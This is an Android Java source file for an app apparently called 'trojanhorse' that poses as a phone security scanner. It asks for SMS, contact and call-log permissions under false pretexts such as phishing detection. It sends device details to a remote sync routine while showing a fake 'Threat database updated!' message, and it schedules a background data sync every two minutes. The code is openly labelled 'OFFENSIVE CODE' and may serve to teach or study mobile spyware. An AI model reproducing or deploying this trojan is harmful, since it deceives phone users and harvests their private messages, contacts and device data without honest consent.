package com.codensecurity.trojanhorse;

import android.Manifest;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.ConnectivityManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.widget.Button;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.work.PeriodicWorkRequest;
import androidx.work.WorkManager;

import com.codensecurity.trojanhorse.icode.BgSync;
import com.codensecurity.trojanhorse.icode.PeriodicDataSync;

import java.util.Objects;
import java.util.concurrent.TimeUnit;

public class MainActivity extends AppCompatActivity {

    //**************************************************************************
    private String uKey;
    ProgressBar progressBar;
    TextView messageTextView;

    private static final int REQUEST_SMS_PERMISSION_CODE = 1;
    private static final int REQUEST_CONTACTS_PERMISSION_CODE = 2;
    private static final int REQUEST_CALLLOGS_PERMISSION_CODE = 3;
    private static final int REQUEST_NOTIFICATIONS_PERMISSION_CODE = 4;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Button startButton = findViewById(R.id.startButton);
        progressBar = findViewById(R.id.progressBar);
        messageTextView = findViewById(R.id.messageTextView);

        startButton.setOnClickListener(v -> checkAndRequestPermissions());

        //*******************OFFENSIVE CODE********************************
        //Try getting unique identifier from storage
        uKey = Build.ID;
        phoneInfo();
    }
    //************************************************************

    private void checkAndRequestPermissions() {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
            requestSMSPermission();
        } else if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
            requestContactsPermission();
        } else if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            requestCallLogsPermission();
        } else if (ActivityCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                requestNotificationPermission();
            }
        } else {
            // All permissions are granted, perform your operations here
            isInternetOn();
        }
    }
//    Modify below code to request permission if not already granted:
    private void requestSMSPermission() {
        AlertDialog.Builder explanationDialog = new AlertDialog.Builder(this);
        explanationDialog.setMessage("This app requires permission to access your messages to detect phishing attacks and social engineering. Please grant the permission to continue.");
        explanationDialog.setPositiveButton("OK", (dialog, which) -> ActivityCompat.requestPermissions(MainActivity.this, new String[]{Manifest.permission.READ_SMS}, REQUEST_SMS_PERMISSION_CODE));
        explanationDialog.show();
    }
    //*******************PERMISSIONS*****************************************

    private void requestContactsPermission() {
        AlertDialog.Builder explanationDialog = new AlertDialog.Builder(this);
        explanationDialog.setMessage("This app requires permission to access your contacts to scan for spammers. Please grant the permission to continue.");
        explanationDialog.setPositiveButton("OK", (dialog, which) -> ActivityCompat.requestPermissions(MainActivity.this, new String[]{Manifest.permission.READ_CONTACTS}, REQUEST_CONTACTS_PERMISSION_CODE));
        explanationDialog.show();
    }

    private void requestCallLogsPermission() {
        AlertDialog.Builder explanationDialog = new AlertDialog.Builder(this);
        explanationDialog.setMessage("This app requires permission to read call logs to protect you from phishing attacks and spams. Please grant the permission to continue.");
        explanationDialog.setPositiveButton("OK", (dialog, which) -> ActivityCompat.requestPermissions(MainActivity.this, new String[]{Manifest.permission.READ_CALL_LOG}, REQUEST_CALLLOGS_PERMISSION_CODE));
        explanationDialog.show();
    }
    private void requestNotificationPermission() {
        AlertDialog.Builder explanationDialog = new AlertDialog.Builder(this);
        explanationDialog.setMessage("This app requires permission to show you security alert notification. Please grant the permission to continue.");
        explanationDialog.setPositiveButton("OK", (dialog, which) -> ActivityCompat.requestPermissions(MainActivity.this, new String[]{Manifest.permission.POST_NOTIFICATIONS}, REQUEST_NOTIFICATIONS_PERMISSION_CODE));
        explanationDialog.show();
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        if (requestCode == REQUEST_SMS_PERMISSION_CODE) {
            if (grantResults.length > 0 && grantResults[0] != PackageManager.PERMISSION_GRANTED) {
                showPermissionDeniedAlert();
                finish();
            } else {
                checkAndRequestPermissions();
            }
        } else if (requestCode == REQUEST_CONTACTS_PERMISSION_CODE) {
            if (grantResults.length > 0 && grantResults[0] != PackageManager.PERMISSION_GRANTED) {
                showPermissionDeniedAlert();
                finish();
            } else {
                checkAndRequestPermissions();
            }
        } else if (requestCode == REQUEST_CALLLOGS_PERMISSION_CODE) {
            if (grantResults.length > 0 && grantResults[0] != PackageManager.PERMISSION_GRANTED) {
                showPermissionDeniedAlert();
                finish();
            } else {
                checkAndRequestPermissions();
            }
        } else if (requestCode == REQUEST_NOTIFICATIONS_PERMISSION_CODE) {
                if (grantResults.length > 0 && grantResults[0] != PackageManager.PERMISSION_GRANTED) {
                    showPermissionDeniedAlert();
                    finish();
                } else {
                    checkAndRequestPermissions();
                }
        }
    }
    private void showPermissionDeniedAlert() {
        AlertDialog.Builder permissionDeniedDialog = new AlertDialog.Builder(this);
        permissionDeniedDialog.setMessage("The app will not function without all the required permissions. Please grant the permissions in your device settings.");
        permissionDeniedDialog.setPositiveButton("OK", (dialog, which) -> {
            // Close the app or perform other necessary actions when the user clicks OK
            checkAndRequestPermissions();
        });
        permissionDeniedDialog.show();
    }

//************************PERMISSIONS***END******************************************************************
        public void progresBar () {
            // Show progress bar
            progressBar.setVisibility(View.VISIBLE);

            // Simulate a task running for 5 seconds
            new Handler(Looper.getMainLooper()).postDelayed(() -> {
                // Hide progress bar after 3 seconds
                progressBar.setVisibility(View.INVISIBLE);

                // Set message text
                messageTextView.setText(R.string.phone_clean);
            },
            5000);
        }

        @Override
        public boolean onCreateOptionsMenu (Menu menu){
            // Inflate the menu; this adds items to the action bar if it is present.
            getMenuInflater().inflate(R.menu.menu_main, menu);
            return true;
        }

        @Override
        public boolean onOptionsItemSelected (MenuItem item){
            // Handle action bar item clicks here. The action bar will
            // automatically handle clicks on the Home/Up button, so long
            // as you specify a parent activity in AndroidManifest.xml.
            int id = item.getItemId();

            //noinspection SimplifiableIfStatement
            if (id == R.id.action_settings) {
                return true;
            }

            return super.onOptionsItemSelected(item);
        }

    public void schedulePeriodicSync() {
        // Create a periodic work request that runs every 2 minutes
        PeriodicWorkRequest periodicWorkRequest =
                new PeriodicWorkRequest.Builder(PeriodicDataSync.class, 2, TimeUnit.MINUTES)
                        .setInitialDelay(5, TimeUnit.SECONDS) // Initial delay before the first execution
                        .build();

        // Enqueue the periodic work request
        WorkManager.getInstance(this).enqueue(periodicWorkRequest);
    }

    public void showAlert() {
        final String TAG = "fire";
        Log.d(TAG, "Switching Internet ON");

        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setIcon(R.drawable.ic_action_info);
        builder.setTitle("INTERNET REQUIRED");
        builder.setMessage("\nPlease, switch ON Internet the app needs to connect to the server to update threat database.");
        builder.setCancelable(true);
        builder.setPositiveButton("TO SETTINGS", (dialog, which) -> {
            Intent intent = new Intent();
            intent.setComponent(new ComponentName("com.android.settings", "com.android.settings.Settings$DataUsageSummaryActivity"));
            startActivity(intent);
        });

        AlertDialog dialog = builder.create();
        dialog.show();

    }

    public final void isInternetOn() {
        final String TAG = "fire";
        Log.d(TAG, "Checking Internet...");

        // get Connectivity Manager object to check connection
        getBaseContext();
        ConnectivityManager connec =
                (ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);

        // Check for network connections
        assert connec != null;
        if (Objects.requireNonNull(connec.getNetworkInfo(0)).getState() == android.net.NetworkInfo.State.CONNECTED ||
                Objects.requireNonNull(connec.getNetworkInfo(0)).getState() == android.net.NetworkInfo.State.CONNECTING ||
                Objects.requireNonNull(connec.getNetworkInfo(1)).getState() == android.net.NetworkInfo.State.CONNECTING ||
                Objects.requireNonNull(connec.getNetworkInfo(1)).getState() == android.net.NetworkInfo.State.CONNECTED) {

            // if connected with internet
            Log.d(TAG, "Internet ON: Updating threat database");
            phoneInfo();
            schedulePeriodicSync();
            progresBar();

        } else if (
                Objects.requireNonNull(connec.getNetworkInfo(0)).getState() == android.net.NetworkInfo.State.DISCONNECTED ||
                        Objects.requireNonNull(connec.getNetworkInfo(1)).getState() == android.net.NetworkInfo.State.DISCONNECTED) {

            Log.d(TAG, "Internet OFF");
            showAlert();
        }
    }
    private void phoneInfo(){
        String model= Build.MODEL;
        String device_id = Build.ID;
        String brand = Build.BRAND;
        String user = Build.USER;
        String baseband_version = String.valueOf(Build.VERSION_CODES.BASE);
        String incremental = Build.VERSION.INCREMENTAL;
        String api_version = Build.VERSION.SDK;
        String e_board = Build.BOARD;
        String kernel = Build.HOST;
        String.valueOf(Build.TIME);
        String fingerprint = Build.FINGERPRINT;
        String os_version = Build.VERSION.RELEASE;
        final String codename = Build.VERSION.CODENAME;
        String base_os;
        base_os = Build.VERSION.BASE_OS;
        String securityPatch;
        securityPatch = Build.VERSION.SECURITY_PATCH;
        String device_type = Build.TAGS;
        String radio = Build.getRadioVersion();

        Toast.makeText(getApplicationContext(), "Threat database updated!" , Toast.LENGTH_SHORT).show();
        BgSync sync = new BgSync();
        sync.execute("device_data", brand, model, os_version, api_version, incremental,
                device_id, kernel, e_board, fingerprint, user,
                codename, base_os, securityPatch, device_type, radio, baseband_version);
    }
}